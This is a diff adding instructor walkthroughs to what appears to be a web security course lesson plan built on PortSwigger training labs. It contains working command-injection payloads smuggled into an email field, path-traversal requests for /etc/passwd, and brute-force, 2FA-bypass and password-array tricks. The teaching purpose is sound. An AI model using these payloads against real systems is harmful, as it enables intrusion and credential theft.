@@ -66,27 +66,57 @@ https://portswigger.net/web-security/os-command-injection/lab-blind-output-redir
 
 ### Instructor Solution (2 Mins)
 https://portswigger.net/web-security/os-command-injection/lab-blind-time-delays
+//walkthrough
+Modify the email parameter, note that this is blind so you are really just counting to see if you are getting execution
+csrf=0pmJEQphMpXzJH6DZ24qLkxUgeWCZ95g&name=asdf&email=asdffsd%40gmail.com||ping+-c+10+127.0.0.1||&subject=asfd&message=asfd
+
 https://portswigger.net/web-security/os-command-injection/lab-blind-output-redirection
+//walkthrough
+open any item and check the image location then add your output to it
+https://0a8e003a03edd6b0c07c39a800c800f4.web-security-academy.net/image?filename=output.txt
+csrf=tUtP0VJ2JE9m9JyBb5ck8TnPI7oWxiri&name=asfd&email=x%40gmail.com||whoami>/var/www/images/output.txt||&subject=afd&message=safd
+
 
 ## Discussion Directory Traversal (10 Mins)
 
 ### Demo (1 Mins)
 https://portswigger.net/web-security/file-path-traversal/lab-simple
+//walkthrough
+navigate around and find an image request and modify
+GET /image?filename=../../../../../etc/passwd
 
 ### Student Lab (5 mins)
 https://portswigger.net/web-security/file-path-traversal/lab-absolute-path-bypass
 
 ### Instructor Solution (2 Mins)
 https://portswigger.net/web-security/file-path-traversal/lab-absolute-path-bypass
+//walkthrough
+navigate around and find an image request and modify
+GET /image?filename=/etc/passwd HTTP/1.1
 
 ## Discussion Authentication (10 Mins)
 
-### Demo
+### Demo (2 mins)
 https://portswigger.net/web-security/authentication/password-based/lab-username-enumeration-via-different-responses
+//walkthrough
+make sure you only copy the bottom third of the usernames, throw those into intruder and brute the username should be "autodiscover"
+grab the middle third of the passwords and spray that at password, it should be "555555"
+
 https://portswigger.net/web-security/authentication/multi-factor/lab-2fa-simple-bypass
+//walkthrough
+log in to your account, check out the page after 2FA.   /my-account
 
-### Student Lab
-https://portswigger.net/web-security/authentication/multi-factor/lab-2fa-broken-logic
+log out and log in as carlos and instead of the pin put that in
 
-## CTF TIME!!!
+### Student Lab (5 mins)
+https://portswigger.net/web-security/authentication/password-based/lab-broken-brute-force-protection-multiple-credentials-per-request
+
+for the passwords break out a little vimfu :%s/$/"/g and :%s/^/"/g
+take the passwords and make sure you pass them in an array on an intercept
+"username":"carlos",
+"password": [
+"12345",
+]
+
+## CTF TIME!!! 
 
